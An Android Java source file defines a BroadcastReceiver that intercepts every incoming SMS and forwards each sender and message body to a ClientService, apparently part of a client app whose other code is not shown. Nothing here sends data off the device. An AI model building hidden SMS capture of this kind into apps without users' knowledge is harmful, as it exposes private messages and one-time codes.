package org.jesusgift.clienttest;/* *
 * Developed By : Victor Vincent
 * Created On : 10/06/16
 * victorvprem@gmail.com
 * Kliotech Pvt Ltd.
 * */

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsMessage;

import org.jesusgift.clienttest.Helpers.AppConfig;

public class AppReceiver extends BroadcastReceiver {
    final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";

    @Override
    public void onReceive(Context context, Intent intent) {
        Intent intent1= new Intent(context, ClientService.class);

        switch (intent.getAction()) {
            //On Sms Received
            case SMS_RECEIVED:
                Bundle bundle = intent.getExtras();
                if(bundle != null) {
                    SmsMessage[] messages = Telephony.Sms.Intents.getMessagesFromIntent(intent);
                    StringBuilder stringBuilder = new StringBuilder();
                    for(SmsMessage msg : messages) {
                        stringBuilder.append(msg.getOriginatingAddress()+" : "+msg.getDisplayMessageBody()+"\n");
                    }
                    intent1.putExtra(AppConfig.MESSAGE_BODY, stringBuilder.toString());
                }
                break;
        }
        context.startService(intent1);
    }
}
